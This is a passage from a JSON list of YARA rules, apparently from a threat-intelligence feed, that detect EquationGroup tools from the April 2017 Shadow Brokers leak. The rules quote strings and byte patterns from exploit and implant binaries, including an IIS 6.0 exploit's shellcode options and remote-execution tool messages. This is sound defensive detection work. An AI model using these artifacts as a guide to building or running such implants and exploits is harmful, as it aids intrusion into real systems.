%ls <logdir> <dll_search_path> <dll_to_load_path> <socket>\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 1 of them )\n}","date":"2017-04-15 16:17:51","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_EpWrapper_RID358C","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"bb7e38b9f22b8de85ddb98b2ab043755","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_DiBa_Target_2000_RID372D : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:27:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"0M1U1Z1p1\" fullword ascii\n      $op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 } \n      $op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 } \n      $op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 3 of them )\n}","date":"2017-04-15 17:27:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_DiBa_Target_2000_RID372D","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"a13982f21bc5caaaca6a4f2780399a25","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_DllLoad_Target_RID3758 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:34:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"BzWKJD+\" fullword ascii\n      $op1 = { 44 24 6c 6c 88 5c 24 6d } \n      $op2 = { 44 24 54 63 c6 44 24 55 74 c6 44 24 56 69 } \n      $op3 = { 44 24 5c 6c c6 44 24 5d 65 c6 44 24 5e } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-04-15 17:34:31","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_DllLoad_Target_RID3758","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"fed04826969ed552ce691bc9965f3ef6","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_EXPA_RID3324 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 14:35:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"* The target is IIS 6.0 but is not running content indexing servicess,\" fullword ascii\n      $x2 = \"--ver 6 --sp <service_pack> --lang <language> --attack shellcode_option[s]sL\" fullword ascii\n      $x3 = \"By default, the shellcode will attempt to immediately connect s$\" fullword ascii\n      $x4 = \"UNEXPECTED SHELLCODE CONFIGURATION ERRORs\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 12000KB and 1 of them )\n}","date":"2017-04-15 14:35:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_EXPA_RID3324","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"0956888b708845615394ca4ae2ebe386","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_RemoteExecute_Target_RID39FB : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:27:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Win32_Process\" fullword ascii\n      $s2 = \"\\\\\\\\%ls\\\\root\\\\cimv2\" fullword wide\n      $op1 = { 83 7b 18 01 75 12 83 63 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-04-15 19:27:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_RemoteExecute_Target_RID39FB","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"ccfa14b55a7791e19a2df499e0a6e78f","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_DS_ParseLogs_RID367C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:57:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"* Size (%d) of remaining capture file is too small to contain a valid header\" fullword wide\n      $x2 = \"* Capture header not found at start of buffer\" fullword wide\n      $x3 = \"Usage: %ws <capture_file> <results_prefix>\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}","date":"2017-04-15 16:57:51","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_DS_ParseLogs_RID367C","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"6fd565c99c208b5c8c8c9d277784a6ac","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Oracle_Implant_RID3780 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:41:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op0 = { fe ff ff ff 48 89 9c 24 80 21 00 00 48 89 ac 24 } \n      $op1 = { e9 34 11 00 00 b8 3e 01 00 00 e9 2a 11 00 00 b8 } \n      $op2 = { 48 8b ca e8 bf 84 00 00 4c 8b e0 8d 34 00 44 8d } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them )\n}","date":"2017-04-15 17:41:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Oracle_Implant_RID3780","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"80b9953a2587b208a68e230ccece1381","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_DmGz_Target_RID362E : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:44:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\\\\\.\\\\%ls\" fullword ascii\n      $s3 = \"6\\\"6<6C6H6M6Z6f6t6\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )\n}","date":"2017-04-15 16:44:51","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_DmGz_Target_RID362E","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"d5af3c268b01a9ef1d477ebf717e9314","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_SetResourceName_RID37EB : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:59:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Updates the name of the dll or executable in the resource file\" fullword ascii\n      $x2 = \"*NOTE: SetResourceName does not work with PeddleCheap versions\" fullword ascii\n      $x3 = \"2 = [appinit.dll] level4 dll\" fullword ascii\n      $x4 = \"1 = [spcss32.exe] level3 exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}","date":"2017-04-15 17:59:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_SetResourceName_RID37EB","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"379639e6ade003f097d2fcc9e93fde8a","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_drivers_Implant_RID3829 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:09:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".?AVFeFinallyFailure@@\" fullword ascii\n      $s2 = \"hZwLoadDriver\" fullword ascii\n      $op1 = { b0 01 e8 58 04 00 00 c3 33 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them )\n}","date":"2017-04-15 18:09:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_drivers_Implant_RID3829","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"efa68f1e327141c8d9bb6c51fec034d9","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Shares_Target_RID3722 : APT DEMO EXE FILE T1047 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:25:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1047\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Select * from Win32_Share\" fullword ascii\n      $s2 = \"slocalhost\" fullword wide\n      $s3 = \"\\\\\\\\%ls\\\\root\\\\cimv2\" fullword wide\n      $s4 = \"\\\\\\\\%ls\\\\%ls\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-04-15 17:25:31","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Shares_Target_RID3722","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"b04386af8b299ff04cf7e10c7b6f626d","score":75,"tags":["APT","DEMO","EXE","T1047","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_ntfltmgr_RID3564 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:11:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"wCw3wDwAw2wNw@wEwZw2wDwEwBwZwFwFw4w2wZw5w1w4wFwZwGwOwGwGwEw5w2wFwGwDwFwOw\" fullword ascii\n      $s6 = \"w+w;w2w0w6w4w.w(wRw\" fullword ascii\n      $op1 = { 80 f7 ff ff 49 89 84 34 18 02 00 00 41 83 a4 34 } \n      $op2 = { ff 15 0b 34 00 00 eb 92 } \n      $op3 = { 4d 8d b4 34 08 02 00 00 4d 85 f6 0f 84 ae } \n      $op4 = { 8b ca 2b ce 8d 34 01 0f b7 3e 66 3b 7d f0 89 75 } \n      $op5 = { 8a 40 01 00 c7 47 70 } \n      $op6 = { e9 3c ff ff ff 6a ff 8d 45 f0 50 e8 27 11 00 00 } \n      $op7 = { 8b 45 08 53 57 8b 7d 0c c7 40 34 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 4 of them )\n}","date":"2017-04-15 16:11:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_ntfltmgr_RID3564","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"660989497995efb8c531e686713e0b7c","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_DiBa_Target_BH_RID36F5 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op0 = { 44 89 20 e9 40 ff ff ff 8b c2 48 8b 5c 24 60 48 } \n      $op1 = { 45 33 c9 49 8d 7f 2c 41 ba } \n      $op2 = { 89 44 24 34 eb 17 4c 8d 44 24 28 8b 54 24 30 48 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}","date":"2017-04-15 17:18:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_DiBa_Target_BH_RID36F5","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"764638e8cb406f38d281b699c08637f5","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_PC_LP_RID3384 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 14:51:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"* Failed to get connection information.  Aborting launcher!\" fullword wide\n      $s2 = \"Format: <command> <target port> [lp port]\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-04-15 14:51:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_PC_LP_RID3384","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"eed646975c6cf416cdcf8aae889514d3","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_RemoteCommand_Lp_RID383C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:12:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Failure parsing command from %hs:%u: os=%u plugin=%u\" fullword wide\n      $s2 = \"Unable to get TCP listen port: %08x\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-04-15 18:12:31","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_RemoteCommand_Lp_RID383C","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"971974f470269497d978fa01d8411c14","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_lp_mstcp_RID3558 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:09:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n      $s2 = \"_PacketNDISRequestComplete@12\\\"\" fullword ascii\n      $s3 = \"_LDNdis5RegDeleteKeys@4\" fullword ascii\n      $op1 = { 89 7e 04 75 06 66 21 46 02 eb } \n      $op2 = { fc 74 1b 8b 49 04 0f b7 d3 66 83 } \n      $op3 = { aa 0f b7 45 fc 8b 52 04 8d 4e } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( all of ( $s* ) or all of ( $op* ) ) )\n}","date":"2017-04-15 16:09:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_lp_mstcp_RID3558","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"a6455048c9a5419b15e3d76596456bfb","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_renamer_RID34E0 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 15:49:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"FILE_NAME_CONVERSION.LOG\" fullword wide\n      $s2 = \"Log file exists. You must delete it!!!\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )\n}","date":"2017-04-15 15:49:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_renamer_RID34E0","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"106a6ee3d141eed69ebad41faac22b2c","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_PC_Exploit_RID35CD : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:28:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\\\\\.\\\\pipe\\\\pcheap_reuse\" fullword wide\n      $s2 = \"**** FAILED TO DUPLICATE SOCKET ****\" fullword wide\n      $s3 = \"**** UNABLE TO DUPLICATE SOCKET TYPE %u ****\" fullword wide\n      $s4 = \"YOU CAN IGNORE ANY 'ServiceEntry returned error' messages after this...\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 1 of them )\n}","date":"2017-04-15 16:28:41","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_PC_Exploit_RID35CD","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"3a702857e3d6479039d8792f2bdb27f4","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_PC_Level3_Gen_RID368C : APT DEMO EXE FILE GEN {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:00:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"S-%u-%u\" fullword ascii\n      $s2 = \"Copyright (C) Microsoft\" fullword wide\n      $op1 = { 24 39 65 c6 44 24 3a 6c c6 44 24 3b 65 c6 44 24 } \n      $op2 = { 44 24 4e 41 88 5c 24 4f ff } \n      $op3 = { 44 24 3f 6e c6 44 24 40 45 c6 44 24 41 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of them )\n}","date":"2017-04-15 17:00:31","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_PC_Level3_Gen_RID368C","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"2612e5cdac71ef211e2e06eb3945ca50","score":75,"tags":["APT","DEMO","EXE","GEN","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_put_Implant9x_RID3734 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:28:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"3&3.3<3A3F3K3V3c3m3\" fullword ascii\n      $op1 = { c9 c2 08 00 b8 72 1c 00 68 e8 c9 fb ff ff 51 56 } \n      $op2 = { 40 1b c9 23 c8 03 c8 38 5d 14 74 05 6a 03 58 eb } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 2 of them )\n}","date":"2017-04-15 17:28:31","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_put_Implant9x_RID3734","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"ca9cae6d1e1f329bbcedd38eb64fd763","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_promiscdetect_safe_RID396A : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:02:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"running on this computer!\" fullword ascii\n      $s2 = \"- Promiscuous (capture all packets on the network)\" fullword ascii\n      $s3 = \"Active filter for the adapter:\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and all of them )\n}","date":"2017-04-15 19:02:51","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_promiscdetect_safe_RID396A","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"47d6fa8a3b0cb849f41d37931edc1249","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_PacketScan_Implant_RID3907 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:46:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op0 = { e9 ef fe ff ff ff b5 c0 ef ff ff 8d 85 c8 ef ff } \n      $op1 = { c9 c2 04 00 b8 34 26 00 68 e8 40 05 00 00 51 56 } \n      $op2 = { e9 0b ff ff ff 8b 45 10 8d 4d c0 89 58 08 c6 45 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them )\n}","date":"2017-04-15 18:46:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_PacketScan_Implant_RID3907","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"3258463f0e6f998f42b0dabe1ea64d41","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_SetPorts_RID353A : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:04:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"USAGE: SetPorts <input file> <output file> <version> <port1> [port2] [port3] [port4] [port5]\" fullword ascii\n      $s2 = \"Valid versions are:  1 = PC 1.2   2 = PC 1.2 (24 hour)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}","date":"2017-04-15 16:04:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_SetPorts_RID353A","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"7c38753c72ef92406543ca60a84dfa25","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_GrDo_FileScanner_Implant_RID3B3F : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 20:21:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = 